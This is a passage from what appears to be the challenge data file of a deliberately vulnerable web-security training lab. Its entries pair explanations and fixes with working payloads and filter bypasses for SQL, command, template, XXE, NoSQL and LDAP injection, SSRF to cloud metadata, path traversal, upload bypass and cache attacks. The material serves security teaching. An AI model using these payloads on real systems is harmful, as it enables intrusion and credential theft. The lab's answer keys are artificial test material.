          medium: ["Username: admin' --", "Password: (anything) — the password field's escaping doesn't matter since the comment already ended the query.", "The FLAG appears."],
          hard: ["In the Department Search box: zzz' UNION SELECT username,password FROM employees --", "This pulls every username/password pair via UNION. The FLAG appears alongside the admin row."],
          expert: ["Submit a Department Note containing: x' UNION SELECT username, password FROM employees --", "It stores successfully — no error, because storage is genuinely safe.", "View the Audit Log for that username.", "The stored note is re-read into a new, unescaped query — the FLAG appears alongside the leaked admin credential."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "command-injection", category: "injection", title: "Command Injection", shortTitle: "Command Injection",
        tags: ["injection", "command-injection", "command"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Network Diagnostics", blurb: "Break out of a 'ping' tool into arbitrary command execution.",
        inputContext: "Form field",
        goal: { explain: "Command injection happens when user input reaches a shell command unsanitized, letting an attacker chain in their own commands.",
          example: "host=10.0.0.5; whoami appends a second command after the intended ping.",
          mission: ["Get the tool to run whoami (or another recognized command) alongside the ping.", "A FLAG appears alongside any successfully injected command's output."] },
        difficultyNotes: { easy: "No filtering — ; && | and backticks all work.", medium: "; and & are stripped — try a pipe |.", hard: "; & | are all stripped — try command substitution with $(...)." },
        why: "Unsanitized input reaches a shell command construction step, and separator-based denylists are incomplete.",
        fix: "Never build shell commands from user input; use an argument-array API (no shell interpretation) and a strict allowlist of permitted characters.",
        reportSummary: {
          easy: "The hostname field reaches a simulated shell command with no filtering — every common separator works.",
          medium: "Semicolon and ampersand are stripped, but the pipe character is not — still a full bypass.",
          hard: "Semicolon, ampersand, and pipe are all stripped, but $(...) command substitution is not covered by the filter."
        },
        reportImpact: {
          easy: "Full arbitrary command execution (simulated) on the host running the vulnerable service.",
          medium: "Same impact as easy — the filter only removes 2 of the many shell metacharacters that enable chaining.",
          hard: "Command substitution is a well-known separator-denylist bypass — a mature filter needs an allowlist, not a blocklist, approach."
        },
        solutionSteps: {
          easy: ["Hostname: 10.0.0.5; whoami", "The FLAG appears alongside the simulated whoami output."],
          medium: ["Hostname: 10.0.0.5| whoami", "Semicolon is blocked but the pipe isn't. The FLAG appears."],
          hard: ["Hostname: $(whoami)", "None of the filtered characters (; & |) are used. The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "ssti", category: "injection", title: "Server-Side Template Injection", shortTitle: "SSTI",
        tags: ["injection", "ssti"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Greeting Card Generator", blurb: "Break out of a server-side template engine.",
        inputContext: "Form field",
        goal: { explain: "SSTI happens when user input is evaluated by a template engine server-side instead of just being inserted as data.",
          example: "{{7*7}} rendering as 49 (instead of literal text) proves the server is evaluating your input as code.",
          mission: ["Confirm {{7*7}} evaluates server-side.", "Escalate toward a code-execution-shaped payload for this difficulty — a FLAG appears when it lands."] },
        difficultyNotes: { easy: "No filtering — try the constructor-chain payload directly.", medium: "The word 'constructor' is stripped — try a payload using 'process' instead.", hard: "'constructor' and 'process' are both stripped — try 'global'." },
        why: "The template engine evaluates arbitrary expressions from user input, and keyword denylists are trivially incomplete.",
        fix: "Never render user input through a full template engine; use a logic-less templating mode or strict sandboxing with an allowlist of safe expressions.",
        reportSummary: {
          easy: "The greeting message is evaluated as a live template expression with no filtering — the classic constructor-chain payload works directly.",
          medium: "The literal word 'constructor' is stripped, but that's only one of several equivalent RCE-shaped keywords.",
          hard: "Both 'constructor' and 'process' are stripped, but 'global' is not — the denylist keeps missing equivalent paths to the same primitive."
        },
        reportImpact: {
          easy: "In a real (non-sandboxed) deployment, this is full server-side remote code execution.",
          medium: "Same severity as easy — keyword filtering doesn't remove the underlying capability, just one spelling of it.",
          hard: "Same severity as easy — three rounds of denylisting still didn't close the class of bug, only specific keywords."
        },
        solutionSteps: {
          easy: ["Message: {{constructor.constructor('return this')()}}", "The FLAG (simulated RCE proof) appears."],
          medium: ["Message: use a payload built around 'process' instead of 'constructor', e.g. referencing process.mainModule.", "The FLAG appears."],
          hard: ["Message: use a payload built around 'global' instead, e.g. referencing global.process.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "xxe", category: "injection", title: "XML External Entity", shortTitle: "XXE",
        tags: ["injection", "xxe", "expert-tier"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Feedback Importer", blurb: "Abuse XML entity expansion to read server files.",
        inputContext: "Form field (XML body)",
        goal: { explain: "XXE happens when an XML parser resolves external entities, letting an attacker define an entity pointing at a local file.",
          example: "<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> plus &xxe; in the body discloses that file's contents.",
          mission: ["Submit the default XML as-is to see normal behavior.", "At higher difficulty, work around the filtered keyword.", "A FLAG appears whenever a real file is actually disclosed."] },
        difficultyNotes: { easy: "SYSTEM and PUBLIC keywords both work directly.", medium: "'SYSTEM' is stripped — try 'PUBLIC' instead.", hard: "Both SYSTEM and PUBLIC are stripped — insert a space inside the keyword, e.g. 'SY STEM'.", expert: "The response never echoes entity content back at all — a genuinely blind sink. Use an external parameter entity referencing the OOB collaborator host, then check the Collaborator Log separately." },
        why: "The parser resolves external entities from user-supplied XML, and the filters used at higher difficulty only match exact contiguous keywords. At expert, the response no longer reflects results at all, but out-of-band exfiltration via an external DTD still works.",
        fix: "Disable external entity resolution (DTDs) entirely in the XML parser configuration — the only real fix, at every tier including expert (a blind sink is not a mitigation, only an inconvenience for the attacker).",
        reportSummary: {
          easy: "The importer resolves SYSTEM/PUBLIC external entities with no filtering at all.",
          medium: "The literal string 'SYSTEM' is stripped, but 'PUBLIC' entities are resolved identically and aren't filtered.",
          hard: "Both keywords are stripped as contiguous strings, but the parser itself tolerates internal whitespace within the keyword — a filter/parser mismatch.",
          expert: "Entity content is never reflected in the response at all — but external parameter entities are still resolved, permitting out-of-band file exfiltration via a chained external DTD and a separate collaborator callback."
        },
        reportImpact: {
          easy: "Arbitrary local file disclosure, including credentials and private keys.",
          medium: "Same impact as easy — PUBLIC entities are just as capable of resolving external files as SYSTEM ones.",
          hard: "Same impact as easy — the disconnect between what the filter matches and what the parser accepts is a common, dangerous real-world pattern.",
          expert: "Same file-disclosure impact as every other tier, reachable even against a fully blind endpoint that never reflects anything — demonstrates that 'the response doesn't show it' is not the same as 'it isn't happening'."
        },
        solutionSteps: {
          easy: ["Use the default payload's <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> as-is.", "The FLAG appears alongside the disclosed /etc/passwd content."],
          medium: ["Change SYSTEM to PUBLIC \"\" \"file:///etc/passwd\" in the entity declaration.", "The FLAG appears."],
          hard: ["Insert a space inside the keyword: SY STEM instead of SYSTEM.", "The filter's exact-string match misses it, but the parser is lenient enough to still resolve it. The FLAG appears."],
          expert: ["Submit the default payload as-is (already structured as an OOB attempt referencing the collaborator host and /etc/passwd).", "Click \"Check for callbacks\" on the Collaborator Log.", "The FLAG appears alongside the exfiltrated file content."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "crlf-injection", category: "injection", title: "CRLF Injection", shortTitle: "CRLF Injection",
        tags: ["injection", "crlf-injection", "crlf"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Newsletter", blurb: "Inject line breaks to split an HTTP response.",
        inputContext: "Form field",
        goal: { explain: "CRLF injection happens when user input reaches a raw header/response value without stripping \\r\\n, letting an attacker inject extra headers or split the response.",
          example: "email=x%0d%0aSet-Cookie: admin=true injects a whole extra header into the response.",
          mission: ["Submit a normal email first.", "At higher difficulty, find the encoding that survives the filter.", "A FLAG appears whenever real response splitting is achieved."] },
        difficultyNotes: { easy: "%0d%0a decodes straight to real CRLF — works directly.", medium: "Real CRLF characters are stripped after decoding — blocked.", hard: "Same stripping as medium, but a second, downstream decode step resurrects double-URL-encoded CRLF (%250d%250a)." },
        why: "Raw CRLF characters are stripped only once; a component further downstream decodes the value a second time, resurrecting double-encoded sequences.",
        fix: "Never build raw header/response text from user input; use your framework's header-setting APIs, which reject invalid characters outright.",
        reportSummary: {
          easy: "%0d%0a decodes directly to real CRLF characters with no filtering, immediately splitting the simulated response.",
          medium: "Real CRLF characters are stripped after the first decode — this tier has no working bypass, demonstrating the filter functioning correctly.",
          hard: "The same stripping runs, but a second downstream decode step (simulating a real multi-layer app) resurrects double-encoded CRLF sequences that survived the first filter untouched."
        },
        reportImpact: {
          easy: "Header injection / response splitting, which can enable cache poisoning or session fixation in real deployments.",
          medium: "No successful bypass at this tier — included to show what a correctly-applied single-layer filter looks like.",
          hard: "Demonstrates why input validation must happen after ALL decoding layers a request will pass through, not just the first."
        },
        solutionSteps: {
          easy: ["Email: x%0d%0aSet-Cookie:%20admin=true", "The FLAG appears alongside the confirmed response split."],
          medium: ["Not exploitable at this tier — the filter correctly blocks single-encoded CRLF after decoding.", "(No FLAG available here — this tier is intentionally solid.)"],
          hard: ["Email: x%250d%250aSet-Cookie:%2520admin=true (double-encoded)", "The first filter pass doesn't touch it; a second decode downstream resurrects the real CRLF. The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "nosql-injection", category: "injection", title: "NoSQL Injection", shortTitle: "NoSQL Injection",
        tags: ["injection", "nosql-injection", "nosql"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API Login", blurb: "Bypass a login by sending a MongoDB-style operator instead of a password.",
        inputContext: "JSON request body",
        goal: { explain: "NoSQL databases like MongoDB accept query operators (e.g. $ne, $gt) as object keys. If a JSON body's field is passed straight into a query, sending an operator object instead of a plain string can change the query's meaning entirely.",
          example: "Sending {\"password\": {\"$ne\": \"\"}} asks 'where password is not empty' instead of checking a specific password.",
          mission: ["Send a normal JSON login first.", "Send an operator object as the password field instead of a string.", "A FLAG appears once you log in as admin via an operator, not the real password."] },
        difficultyNotes: { easy: "No filtering — $ne works directly.", medium: "$ne is stripped from the request body text — try $gt instead.", hard: "$gt is also stripped — try $regex with a wildcard pattern." },
        why: "The password field is matched using a custom function that trusts whatever shape the client sends, including operator objects, instead of requiring a plain string.",
        fix: "Enforce a strict schema on all query inputs (reject non-string types for fields that should be strings) before they ever reach the database layer.",
        reportSummary: {
          easy: "The password field accepts operator objects with no filtering at all.",
          medium: "The literal substring \"$ne\" is stripped from the request body, but \"$gt\" is not.",
          hard: "Both \"$ne\" and \"$gt\" are stripped, but \"$regex\" is not — and a wildcard regex matches any password."
        },
        reportImpact: {
          easy: "Instant authentication bypass for any account, including admin.",
          medium: "Same bypass via a different, equally-simple operator.",
          hard: "Same bypass via a regex operator — demonstrates that a keyword denylist can never cover every MongoDB operator."
        },
        solutionSteps: {
          easy: ["POST {\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}", "The FLAG appears in the response."],
          medium: ["POST {\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}", "The FLAG appears."],
          hard: ["POST {\"username\":\"admin\",\"password\":{\"$regex\":\".*\"}}", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "ldap-injection", category: "injection", title: "LDAP Injection", shortTitle: "LDAP Injection",
        tags: ["injection", "ldap-injection", "ldap"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Employee Directory (LDAP)", blurb: "Break out of an LDAP search filter to dump the whole directory.",
        inputContext: "Form field",
        goal: { explain: "LDAP search filters are built from string concatenation just like SQL queries. Unescaped special characters (*, parentheses) let an attacker change the filter's logic to match far more than intended.",
          example: "A search for uid=* can return every directory entry instead of a specific user.",
          mission: ["Search for a normal username first.", "Try to make the filter return every entry, including the hidden admin secret.", "A FLAG appears once the admin's secret is disclosed."] },
        difficultyNotes: { easy: "A bare wildcard (*) returns everything.", medium: "The wildcard is stripped — try the classic OR-breakout: x)(|(uid=*", hard: "Both the wildcard and the OR-breakout pattern are filtered — try a control character (newline) in the input." },
        why: "The search filter is built via string concatenation with no escaping, and the filters added at higher tiers only cover the specific patterns they were tested against.",
        fix: "Use a proper LDAP escaping function for every value inserted into a filter — never build filters via string concatenation.",
        reportSummary: {
          easy: "A bare wildcard character in the uid field returns the entire directory with no escaping at all.",
          medium: "The wildcard character is stripped, but the classic parenthesis-based OR-breakout technique isn't filtered.",
          hard: "Both the wildcard and the OR-breakout pattern are filtered, but a stray control character (newline) still confuses the simulated filter parser."
        },
        reportImpact: {
          easy: "Full employee directory disclosure, including a hidden admin secret never meant to be listed.",
          medium: "Same disclosure via a different classic LDAP injection technique.",
          hard: "Same disclosure — demonstrates that pattern-specific filters miss encoding/control-character variations."
        },
        solutionSteps: {
          easy: ["Search uid=*", "The FLAG appears alongside the dumped directory."],
          medium: ["Search uid=x)(|(uid=*", "The FLAG appears."],
          hard: ["Search with a uid value containing a newline character.", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "http-param-pollution", category: "injection", title: "HTTP Parameter Pollution", shortTitle: "HTTP Parameter Pollution",
        tags: ["injection", "http-param-pollution", "http", "param", "pollution"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Orders", blurb: "Exploit inconsistent handling of duplicate parameters to apply a hidden discount.",
        inputContext: "Duplicate URL parameters / JSON body array",
        goal: { explain: "When the same parameter is submitted more than once, different parts of an application can disagree about which value 'wins' — one code path might validate the first value while another applies the last.",
          example: "?discount=WELCOME10&discount=STAFF100 might get validated against the first (a real coupon) but applied using the last (a hidden 100%-off staff coupon).",
          mission: ["Apply the real WELCOME10 coupon normally first.", "Find the construction that applies the hidden STAFF100 coupon for this tier.", "A FLAG appears once it's actually applied."] },
        difficultyNotes: { easy: "Send the discount parameter twice in the URL: a valid coupon first, the hidden one second.", medium: "Duplicate URL parameters are fixed — but a JSON body override with no validation at all still works.", hard: "The plain JSON body is now validated too — but a JSON body ARRAY value reintroduces the same validate-first/apply-last bug in that new code path." },
        why: "Each fix patched one specific input surface without addressing the underlying pattern: validating one value while applying a different one.",
        fix: "Always validate and apply the exact same resolved value — never let two different code paths read from a multi-value input independently.",
        reportSummary: {
          easy: "Duplicate query parameters are validated using the first value but applied using the last.",
          medium: "Query-string pollution is fixed, but the same endpoint's JSON body path applies whatever value is sent with zero validation.",
          hard: "The JSON body path now validates plain string values, but an array value in the JSON body reintroduces the identical validate-first/apply-last bug."
        },
        reportImpact: {
          easy: "A 100%-off hidden coupon is applied to any order with a two-parameter query string.",
          medium: "Same impact via a simpler, single JSON field with no pollution needed at all.",
          hard: "Same impact — demonstrates that fixing one input surface can just relocate the bug to another."
        },
        solutionSteps: {
          easy: ["Visit /vuln/http-param-pollution?discount=WELCOME10&discount=STAFF100", "The FLAG appears."],
          medium: ["POST JSON {\"discount\":\"STAFF100\"} to /vuln/http-param-pollution/apply", "The FLAG appears."],
          hard: ["POST JSON {\"discount\":[\"WELCOME10\",\"STAFF100\"]} to /vuln/http-param-pollution/apply", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "host-header-injection", category: "injection", title: "Host Header Injection", shortTitle: "Host Header Injection",
        tags: ["injection", "host-header-injection", "host", "header"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Password Reset Mailer", blurb: "Poison a password reset link by controlling the Host header.",
        inputContext: "HTTP header (Host / X-Forwarded-Host, simulated)",
        goal: { explain: "If a password reset link is built using the request's Host header instead of a hardcoded trusted domain, controlling that header lets an attacker redirect the reset link to their own domain.",
          example: "A reset email link built as https://{Host header}/reset?token=... can be pointed anywhere the attacker wants if the Host header isn't validated.",
          mission: ["Generate a reset link with a normal Host value first.", "Get the tool to build a link pointing at an attacker domain for this tier.", "A FLAG appears once it points off-domain."] },
        difficultyNotes: { easy: "The Host header value is trusted directly.", medium: "Host is now ignored — but X-Forwarded-Host is trusted instead, with no validation.", hard: "Both headers are validated against an allowlist — but via a substring .includes() check, bypassable with a lookalike domain." },
        why: "Each fix shifted trust to a different header or a weaker validation method, without ever validating against an exact expected value.",
        fix: "Never build absolute URLs from any client-supplied header; use a hardcoded, configured domain for all security-sensitive links.",
        reportSummary: {
          easy: "The reset link is built directly from the Host header with no validation.",
          medium: "Host is ignored, but X-Forwarded-Host is trusted instead with equally no validation.",
          hard: "Both headers are checked against an allowlist, but a substring check is satisfied by any domain that merely contains the trusted string."
        },
        reportImpact: {
          easy: "Password reset tokens can be delivered to an attacker-controlled domain, enabling account takeover.",
          medium: "Same impact via the header a reverse proxy would normally set.",
          hard: "Same impact — demonstrates that substring-based domain checks are a common, real-world bypassable pattern."
        },
        solutionSteps: {
          easy: ["Set host_header to attacker.test.", "The FLAG appears."],
          medium: ["Set xfh to attacker.test (host_header is ignored at this tier).", "The FLAG appears."],
          hard: ["Set xfh to securecorp-demo.test.attacker.test (contains the trusted substring).", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ------------------------------------------------------- SERVER LOGIC
      {
        id: "ssrf", category: "server-logic", title: "Server-Side Request Forgery", shortTitle: "SSRF",
        tags: ["server-logic", "ssrf", "expert-tier"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Health Check Tool", blurb: "Trick the server into reaching an internal-only address.",
        inputContext: "Form field (URL)",
        goal: { explain: "SSRF happens when a server fetches a URL you control, letting you reach internal-only services it can access but you normally can't.",
          example: "A 'health check' tool that fetches any URL you give it can be pointed at internal metadata endpoints.",
          mission: ["Try the AWS-style metadata address directly.", "At higher difficulty, find an encoding or chaining trick past the blocklist.", "A FLAG appears whenever a fake internal service actually responds."] },
        difficultyNotes: { easy: "Internal addresses work directly — try 169.254.169.254, 127.0.0.1, localhost:6379, or internal-api.local.", medium: "Literal internal addresses are blocked — try a decimal or hex-encoded IP instead.", hard: "Encoded IPs are blocked too — try chaining through the trusted redirector (safe-redirector.securecorp-demo.test/go?to=).", expert: "Encoded IPs AND the redirector are both blocked now — the filter is genuinely more thorough. It only ever checks IPv4-style representations, though." },
        why: "The server fetches attacker-controlled URLs, and blocklists based on literal string matching miss alternate encodings and redirect chaining.",
        fix: "Use a strict allowlist of permitted destination hosts, resolve and re-check the IP after any redirect, and block link-local/loopback ranges at the network layer too.",
        reportSummary: {
          easy: "The health-check tool fetches any attacker-supplied URL with zero restriction on destination.",
          medium: "Literal internal IP/hostname strings are blocked, but the same addresses in decimal or hex form aren't recognized by the blocklist.",
          hard: "Encoded IPs are also blocked, but requests chained through a 'trusted' internal redirector are followed without re-checking the final destination.",
          expert: "Numeric/hex IP encoding and the open redirector are both closed, but the filter only ever checks IPv4-style host representations — a bracketed IPv6 loopback or IPv4-mapped-IPv6 address for the exact same internal target is never recognized at all."
        },
        reportImpact: {
          easy: "Direct access to cloud metadata endpoints, often yielding live cloud credentials.",
          medium: "The same metadata access is reachable with a one-line IP-encoding trick — the blocklist provides a false sense of security.",
          hard: "Demonstrates that blocking a destination isn't enough if a trusted redirector on your own infrastructure can be abused to reach it anyway.",
          expert: "Demonstrates that even a filter that has already closed two real bypass classes can still be incomplete — 'more thorough' isn't the same as 'complete' unless every address representation for a given target is normalized before comparison."
        },
        solutionSteps: {
          easy: ["URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", "The FLAG appears alongside the fake leaked credentials."],
          medium: ["URL: http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/admin (hex-encoded 169.254.169.254)", "The FLAG appears."],
          hard: ["URL: https://safe-redirector.securecorp-demo.test/go?to=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", "The FLAG appears once the chained request resolves."],
          expert: ["Confirm both the hard-tier techniques are now blocked.", "URL: http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/admin (IPv4-mapped IPv6 notation)", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "file-upload", category: "server-logic", title: "Insecure File Upload", shortTitle: "File Upload",
        tags: ["server-logic", "file-upload", "file", "upload"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Profile Picture Upload", blurb: "Bypass extension checks on an upload form.",
        inputContext: "File upload (multipart form)",
        goal: { explain: "Insecure upload validation lets an attacker upload a file type that would execute as code if the storage location is web-accessible.",
          example: "Blocking '.php' case-sensitively still lets '.PHP' or '.pHp' through.",
          mission: ["Upload a normal file first.", "Try a blocked extension, then find the bypass for the current difficulty.", "A FLAG appears whenever the upload validation is actually bypassed."] },
        difficultyNotes: { easy: "No validation at all.", medium: "'.php' is blocked case-sensitively — try '.PHP'.", hard: "All php-like/executable extensions are blocked case-insensitively — but only the extension is checked, never real content, so a totally different name like 'shell.jpg' sails through regardless of content." },
        why: "Validation relies on a denylist of extensions (sometimes case-sensitive) and never inspects real file content — denylists are inherently incomplete.",
        fix: "Validate against a strict allowlist of safe extensions, verify actual file content (magic bytes), and serve uploads from a non-executable, isolated storage location.",
        reportSummary: {
          easy: "No file type validation exists at all — any extension, including executable ones, is accepted.",
          medium: "'.php' is blocked, but the check is case-sensitive, so '.PHP' or mixed-case variants pass straight through.",
          hard: "All php-like extensions are blocked case-insensitively, but validation never inspects real file content — any harmless-looking extension bypasses it entirely regardless of what's inside."
        },
        reportImpact: {
          easy: "In a misconfigured deployment, this leads directly to remote code execution via an uploaded web shell.",
          medium: "Same RCE risk as easy — case-sensitivity is a near-zero-effort bypass.",
          hard: "Same RCE risk as easy — proves that extension denylisting alone, however thorough, can't replace real content validation."
        },
        solutionSteps: {
          easy: ["Upload a file named shell.php (any content).", "The FLAG appears confirming the unrestricted upload."],
          medium: ["Upload a file named shell.PHP (uppercase extension).", "The case-sensitive check misses it. The FLAG appears."],
          hard: ["Upload a file named shell.jpg (any content, including non-image bytes).", "The extension denylist never matches '.jpg'. The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "path-traversal", category: "server-logic", title: "Path Traversal", shortTitle: "Path Traversal",
        tags: ["server-logic", "path-traversal", "path", "traversal"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Document Viewer", blurb: "Escape the intended folder to read arbitrary files.",
        inputContext: "URL parameter",
        goal: { explain: "Path traversal happens when user input builds a file path without stopping '../' sequences from escaping the intended directory.",
          example: "file=../../../etc/passwd walks up out of the documents folder to the filesystem root.",
          mission: ["View a normal document first.", "At higher difficulty, find the filter bypass.", "A FLAG appears whenever a file outside the documents folder is actually disclosed."] },
        difficultyNotes: { easy: "No sanitization — traverse directly.", medium: "A single pass strips '../' once — try '....//' (which collapses back into '../' after one strip).", hard: "'../' is stripped recursively — try double URL-encoding (%252e%252e%252f) instead." },
        why: "The path is normalized/filtered but a downstream step (or an incomplete single-pass filter) still permits traversal via nesting tricks or double-encoding.",
        fix: "Resolve the final path and verify it's still inside the allowed base directory (allowlist check on the resolved absolute path), not just filtering the raw string.",
        reportSummary: {
          easy: "The file parameter is used to build a path with no sanitization at all.",
          medium: "A single-pass filter removes one occurrence of '../', but nested dot sequences collapse back into a working traversal after that one pass.",
          hard: "The filter strips '../' recursively (closing the nesting trick), but doesn't account for a downstream component decoding the path a second time."
        },
        reportImpact: {
          easy: "Arbitrary file read anywhere the process has filesystem access.",
          medium: "Same impact as easy — the single-pass filter is a well-known incomplete defense.",
          hard: "Same impact as easy — recursive filtering alone still isn't enough without also controlling for double-encoding at the transport layer."
        },
        solutionSteps: {
          easy: ["file=../../../etc/passwd", "The FLAG appears alongside the disclosed file."],
          medium: ["file=....//....//....//etc/passwd", "Each '....//' collapses to '../' after the single-pass strip. The FLAG appears."],
          hard: ["file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd (double URL-encoded)", "Survives the recursive strip since it isn't literal '../' yet. The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "lfi", category: "server-logic", title: "Local File Inclusion", shortTitle: "LFI",
        tags: ["server-logic", "lfi"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Multilingual Loader", blurb: "Include arbitrary local files via a language-selection parameter.",
        inputContext: "URL parameter",
        goal: { explain: "LFI is path traversal applied to an 'include' feature — instead of just reading a file, the app pulls it into the page/template.",
          example: "lang=../../../etc/passwd tricks the template loader into including a file it was never meant to.",
          mission: ["Load a normal language first (en/fr/es).", "At higher difficulty, find the filter bypass.", "A FLAG appears whenever a file outside the templates folder is included."] },
        difficultyNotes: { easy: "No sanitization — traverse directly.", medium: "Single-pass '../' stripping — bypass with '....//'.", hard: "Recursive stripping — bypass with double URL-encoding." },
        why: "Same root cause as path traversal — user input reaches a file-inclusion step without validating the resolved path stays inside the intended directory.",
        fix: "Use a strict allowlist of valid language codes instead of building a file path from user input at all.",
        reportSummary: {
          easy: "The lang parameter is used to build an include path with no sanitization at all.",
          medium: "A single-pass '../' filter is bypassed the same way as path traversal's medium tier, via nested dot sequences.",
          hard: "Recursive stripping closes the nesting trick, but double URL-encoding still survives to a downstream decode step."
        },
        reportImpact: {
          easy: "Arbitrary local file disclosure, and in real PHP-style LFI, potential code execution via log/session poisoning.",
          medium: "Same impact as easy.",
          hard: "Same impact as easy — LFI chains are especially dangerous because 'include' semantics can escalate file read into code execution in some real stacks."
        },
        solutionSteps: {
          easy: ["lang=../../../etc/passwd", "The FLAG appears alongside the disclosed file."],
          medium: ["lang=....//....//....//etc/passwd", "The FLAG appears."],
          hard: ["lang=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "The FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "cache-poisoning", category: "server-logic", title: "Web Cache Poisoning", shortTitle: "Cache Poisoning",
        tags: ["server-logic", "cache-poisoning", "cache", "poisoning"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Homepage", blurb: "Poison a shared cache so every visitor sees your payload.",
        inputContext: "URL parameter (unkeyed)",
        goal: { explain: "Cache poisoning happens when a cache key ignores an input that still affects the response, so a malicious response gets cached and served to everyone.",
          example: "A tracking parameter gets reflected into the page, but the cache key doesn't include it — so the poisoned response is served to the next visitor too, even with no query string.",
          mission: ["Find which tracking parameter is unkeyed for this difficulty.", "Load the page with a distinctive value for it, then reload with NO query string and confirm your value (and FLAG) persisted from cache."] },
        difficultyNotes: { easy: "utm_source is the unkeyed parameter — the cache key includes all other known tracking params.", medium: "utm_source is now included in the cache key (fixed) — but ref is unkeyed instead.", hard: "Both utm_source and ref are now keyed — but lang is unkeyed instead." },
        why: "Each time the obviously-unkeyed parameter gets added to the cache key, a similar parameter introduced elsewhere is missed — a realistic pattern of incomplete fixes.",
        fix: "Include every input that affects the response in the cache key, or explicitly strip/normalize every unrecognized query parameter before both rendering and caching.",
        reportSummary: {
          easy: "The cache key includes every known tracking parameter except utm_source, which is reflected into the response.",
          medium: "utm_source was added to the cache key, but a different parameter (ref) is reflected and still unkeyed.",
          hard: "Both utm_source and ref are now keyed, but a third parameter (lang) is reflected and still unkeyed."
        },
        reportImpact: {
          easy: "A single crafted request poisons what every subsequent visitor sees for the cache's TTL.",
          medium: "Same impact as easy — fixing one unkeyed parameter didn't catch a near-identical one.",
          hard: "Same impact as easy — demonstrates that partial fixes for this bug class tend to just relocate it."
        },
        solutionSteps: {
          easy: ["Visit /vuln/cache-poisoning?utm_source=YOUR_PAYLOAD", "Reload with no query string at all — your value (and the FLAG) are still shown, served from cache."],
          medium: ["Visit /vuln/cache-poisoning?ref=YOUR_PAYLOAD (utm_source no longer works).", "Reload with no query string — the FLAG persists."],
          hard: ["Visit /vuln/cache-poisoning?lang=YOUR_PAYLOAD (utm_source and ref no longer work).", "Reload with no query string — the FLAG persists."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "cache-deception", category: "server-logic", title: "Web Cache Deception", shortTitle: "Cache Deception",
        tags: ["server-logic", "cache-deception", "cache", "deception"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp My Account", blurb: "Trick a cache into storing a private, personalized response.",
        inputContext: "URL path / query",
        goal: { explain: "Cache deception happens when a cache decides to store a response just because the URL LOOKS static (e.g. ends in .js), even though it's actually private/personalized.",
          example: "/account/nonexistent.js still renders your private account page (ignored trailing segment) — and gets cached because of the .js-looking extension.",
          mission: ["Find the technique that still works for this difficulty.", "A FLAG appears alongside the private data once it's cached under a deceptive URL."] },
        difficultyNotes: { easy: "Appending a fake static filename to the path works directly (e.g. /account/x.js).", medium: "The path trick is fixed (extra segments now 404) — but a query string containing a static-looking extension anywhere still triggers caching (e.g. /account?a=x.js).", hard: "The query-string check is now stricter — the extension must appear specifically as a query VALUE (e.g. /account?callback=x.js), not just anywhere in the URL." },
        why: "Each fix narrowed the bug without fully closing the underlying issue — deciding cacheability from surface-level URL pattern matching instead of an explicit application decision.",
        fix: "Never key caching decisions on URL extension or pattern matching; only cache responses explicitly marked cacheable by the application, and route unmatched paths to a real 404.",
        reportSummary: {
          easy: "Appending a static-looking extension directly to the path causes the private response to be cached and replayable.",
          medium: "The path-based trick is fixed, but the cache rule still matches a static extension appearing anywhere in the full URL, including the query string.",
